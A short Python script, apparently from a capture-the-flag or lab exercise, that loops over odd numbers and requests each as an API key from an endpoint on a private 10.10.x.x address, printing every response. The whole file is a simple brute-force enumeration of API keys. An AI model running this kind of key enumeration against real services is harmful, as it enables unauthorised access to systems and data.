#!/usr/bin/python3

import requests 

for api_key in range(1,100,2):
	print(f"api_key {api_key}")
	html = requests.get(f'http://10.10.149.188:80/api/{api_key}') 

	print(html.text)


